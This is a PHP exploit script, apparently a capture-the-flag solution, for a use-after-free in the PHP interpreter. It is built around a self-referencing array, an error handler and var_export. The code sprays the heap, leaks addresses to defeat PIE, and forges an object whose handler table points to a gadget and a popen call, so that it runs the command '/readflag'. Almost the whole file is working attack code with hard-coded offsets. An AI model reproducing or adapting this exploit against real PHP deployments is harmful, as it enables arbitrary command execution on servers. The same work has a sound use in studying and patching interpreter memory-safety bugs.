<?php

$storage_len = 16;
$x = array_fill(0, $storage_len, 0xdeadbeef);
$x[0] = &$x;

function p8($n) { return chr($n&255); }
function p16($n) { return p8($n).p8($n>>8); }
function p32($n) { return p16($n).p16($n>>16); }
function p64($n) { return p32($n).p32($n>>32); }
function u8($s) { return ord($s); }
function u16($s) { return u8($s) + (u8($s[1])<<8); }
function u32($s) { return u16($s) + (u16(substr($s, 2))<<16); }
function u64($s) { return u32($s) + (u32(substr($s, 4))<<32); }
function rand64() { return rand()*0x100000000 + rand(); }
function pad($x, $n) { return $x . str_repeat("A", $n-strlen($x)); }

// 00: zval.value
// 08: zval.u1.type_info
// 0c: some garbage
// 10: h
// 18: key

$spam = array_fill(0, 10000, 0);
for ($i = 0; $i < 10000; $i++) {
	$spam[$i] = array();
}

function get_addr($str) {
	print "[*] searching for base...\n";
	for ($attempt = 0; $attempt < 100; $attempt++) {
		$marker = rand64();
		$marker_s = bin2hex(p64($marker));
		$anchor = str_repeat("A", 100);
		$container = array();
		for ($i = 0; $i < 100; $i++) {
			$container[] = $marker;
			$container[] = $str;
		}
		for ($ofs = 0; $ofs < 10240; $ofs += 8) {
			$x = pwnlib_hexdump($anchor, $ofs, 8);
			if ($x == $marker_s) {
				return u64(hex2bin(pwnlib_hexdump($anchor, $ofs+32, 8)));
			}
		}
		printf("attempt %d\n", $attempt);
		$spam[] = $anchor;
		$spam[] = $container;
	}
	die("[-] did not find base");
	return 0;
}

function break_pie() {
	$marker = rand64();
	$marker_s = bin2hex(p64($marker));
	print "[*] breaking PIE...\n";

	$pre = str_repeat("A", 0xf0);
	$pre_addr = get_addr($pre)+24;
	printf("pre_addr = 0x%016x\n", $pre_addr);
	for ($attempt = 0; $attempt < 1000; $attempt++) {
		$anchor = str_repeat("A", 100);
		$container = array();
		$o = new StdClass();
		for ($i = 0; $i < 100; $i++) {
			$container[] = $marker;
			$container[] = $o;
		}
		for ($ofs = 0; $ofs < 10240; $ofs += 8) {
			$x = pwnlib_hexdump($anchor, $ofs, 8);
			if ($x == $marker_s) {
				$addr = u64(hex2bin(pwnlib_hexdump($anchor, $ofs+32, 8)));
				printf("addr = 0x%016x  (0x%016x)\n", $addr, $pre_addr);

				if ($addr < $pre_addr) {
					print "object is before pre\n";
					break;
				}

				$ofs = $addr+24 - $pre_addr;
				printf("ofs = 0x%016x\n", $ofs);
				$pie = u64(hex2bin(pwnlib_hexdump($pre, $ofs, 8))) - 0x007ff200;
				printf("PIE leak: 0x%016x\n", $pie);
				return $pie;
			}
		}
		printf("attempt %d\n", $attempt);
	}
	die("could not break pie");
}

$pie = break_pie();
$golden = 0x2d0fec; # mov rdi, qword ptr [rdi]; call qword ptr [rbx + 0x10]
$call_popen = 0x00208b9a;


$cmd = "/readflag\x00";
$handlers =
	pad("", 0xe0) .
	p64($pie + $golden) .
	""
;
$handlers_addr = get_addr($handlers) + 24;
printf("\$handlers = 0x%016x\n", $handlers_addr);

$obj =
	pad($cmd, 24) .
	p64($handlers_addr) . // handlers
	""
;
	
$obj_addr = get_addr($obj) + 24;
printf("\$obj = 0x%016x\n", $obj_addr);

$PAYLOAD =
	"PAYLOAD!" .
	"PAYLOAD!" .
	p64($obj_addr) . p64(8) . p64($pie + $call_popen) . p64(0)
;
$target_len = 32*$storage_len+8-1-0x18;
assert($target_len >= strlen($PAYLOAD));
$PAYLOAD = "A" . $PAYLOAD . str_repeat("A", $target_len);

set_error_handler(function($errno, $errstr){
	print "In error_handler closure: $errno: $errstr\n";

	global $x, $PAYLOAD;
	$x[100] = 0;
	$get_rekt = substr($PAYLOAD, 1); // memcpy PAYLOAD into old storage
});

var_export([&$x]);
